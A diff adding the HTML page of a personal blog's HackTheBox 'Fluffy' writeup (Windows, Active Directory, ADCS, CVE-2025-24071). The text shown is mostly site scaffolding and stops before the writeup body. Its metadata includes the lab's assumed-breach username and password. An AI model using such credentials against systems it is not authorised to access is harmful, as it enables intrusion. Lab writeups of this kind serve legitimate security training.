@@ -1,0 +1,2093 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>HackTheBox-Fluffy &middot; Bailey&#39;s Blog</title>
+    <meta name="title" content="HackTheBox-Fluffy &middot; Bailey&#39;s Blog">
+
+  
+  <meta name="description" content="Detailed writeup of fluffy from HackTheBox">
+  <meta name="keywords" content="hackthebox,Windows,Active Directory,CVE-2025-24071,ADCS,">
+  
+  
+  <link rel="canonical" href="https://localhost:1313/writeups/htb-fluffy/">
+  <link rel="stylesheet" href="/css/chroma.css">
+  <link rel="stylesheet" href="/css/term.css">
+  <link rel="stylesheet" href="/css/copy-btn.css">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.41ccf158e8b20af093f904e765d07015a786fdc35677cfc16ffff96a6b5235a45e9ce5dc22b59be2c7ec2ae5e4f302e565ca1e75c2439c5c81d44f4c70102851.css"
+    integrity="sha512-QczxWOiyCvCT&#43;QTnZdBwFaeG/cNWd8/Bb//5amtSNaRenOXcIrWb4sfsKuXk8wLlZcoedcJDnFyB1E9McBAoUQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js"
+      integrity="sha512-mBTe6WFNMq61YjnRGO3&#43;IKzWIxQk&#43;bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script>
+  
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.d9ad02b8cdad6c2d39586a85807e1a240c1c6ea031ba5cd39afd9791567621d0a6fdc4ee316164f6472f8e3b03b5ab6644bdd33050bbaa92cef80537de5345b3.js"
+      integrity="sha512-2a0CuM2tbC05WGqFgH4aJAwcbqAxulzTmv2XkVZ2IdCm/cTuMWFk9kcvjjsDtatmRL3TMFC7qpLO&#43;AU33lNFsw=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="https://localhost:1313/writeups/htb-fluffy/">
+  <meta property="og:site_name" content="Bailey&#39;s Blog">
+  <meta property="og:title" content="HackTheBox-Fluffy">
+  <meta property="og:description" content="Detailed writeup of fluffy from HackTheBox">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-09-19T14:53:56+00:00">
+    <meta property="article:modified_time" content="2025-09-19T14:53:56+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="CVE-2025-24071">
+    <meta property="article:tag" content="ADCS">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HackTheBox-Fluffy">
+  <meta name="twitter:description" content="Detailed writeup of fluffy from HackTheBox">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Writeups",
+    "name": "HackTheBox-Fluffy",
+    "headline": "HackTheBox-Fluffy",
+    "description": "Detailed writeup of fluffy from HackTheBox",
+    "abstract": "\u003ch2 class=\u0022relative group\u0022\u003eOverview \n    \u003cdiv id=\u0022overview\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\u0022 href=\u0022#overview\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePlatform\u003c\/strong\u003e: HackTheBox\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty\u003c\/strong\u003e: Easy\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c\/strong\u003e: Windows\u003c\/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills\u003c\/strong\u003e: Active Directory, privilege escalation\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003eAssumed Breach Credentials: j.fleischman \/ J0elTHEM4n1990!\u003c\/strong\u003e\u003c\/em\u003e\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "https:\/\/localhost:1313\/writeups\/htb-fluffy\/",
+    "author" : {
+      "@type": "Person",
+      "name": "BeejaySec"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-09-19T14:53:56\u002b00:00",
+    "datePublished": "2025-09-19T14:53:56\u002b00:00",
+    
+    "dateModified": "2025-09-19T14:53:56\u002b00:00",
+    
+    "keywords": ["hackthebox","Windows","Active Directory","CVE-2025-24071","ADCS"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2319"
+  }]
+  </script>
+
+
+
+  
+  
+    <meta name="author" content="BeejaySec">
+  
+  
+    
+      
+        
+          <link href="https://www.linkedin.com/in/bailey-bradshaw-194597198/" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://github.com/0xBeejay" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/bailey-bradshaw-194597198/" rel="me">
+        
+      
+    
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+  
+  
+
+  <script
+  async
+  src="https://www.googletagmanager.com/gtag/js?id=G-PEDMYR1V0K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PEDMYR1V0K');
+</script>
+
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+    
+    
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium">
+          Bailey&rsquo;s Blog
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/about/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="whoami">
+    About
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/projects/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="">
+    Projects
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/writeups/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Writeups">
+    Writeups
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/contact/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Contact">
+    Contact
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+    
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/about/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="whoami">
+      About
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/projects/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="">
+      Projects
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/writeups/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Writeups">
+      Writeups
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/contact/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Contact">
+      Contact
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+  <script>
+    (function () {
+      var $mainmenu = $(".main-menu");
+      var path = window.location.pathname;
+      $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+        $(e).children("p").addClass("active");
+      });
+    })();
+  </script>
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
+  integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+  
+    
+      
+    
+  
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    <img
+      id="background-image"
+      src="/img/background.svg"
+      alt="Background Image"
+      class="absolute inset-0 w-full h-full object-cover">
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
+      integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/img/background.svg"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
+      >Bailey&#39;s Portfolio</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeups/"
+      >Writeups</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeups/htb-fluffy/"
+      >HackTheBox-Fluffy</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox-Fluffy
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <span>2319 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">11 mins</span><span class="px-2 text-primary-500">&middot;</span><span class="mb-[2px]">
+  <span
+    id="zen-mode-button"
+    class="text-lg hover:text-primary-500"
+    title="Enable zen mode"
+    data-title-i18n-disable="Enable zen mode"
+    data-title-i18n-enable="Disable zen mode">
+    <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg></span></span>
+  </span>
+</span>
+
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/categories/writeups/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Writeups
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/hackthebox/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Hackthebox
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/windows/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Windows
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/active-directory/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Active Directory
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/cve-2025-24071/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    CVE-2025-24071
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/adcs/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    ADCS
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
+        width="96"
+        height="96"
+        alt="BeejaySec"
+        src="/img/chrollo_hu_b8a595a15dc0bcb.jpg">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Author
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        BeejaySec
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">A cybersecurity enthusiast focusing on infra and web application security, constantly honing my skills through the participation of CTF&rsquo;s and security challenges.</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/bailey-bradshaw-194597198/"
+          target="_blank"
+          aria-label="Linkedin"
+          title="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/0xBeejay"
+          target="_blank"
+          aria-label="Github"
+          title="Github"
+          rel="me noopener noreferrer"
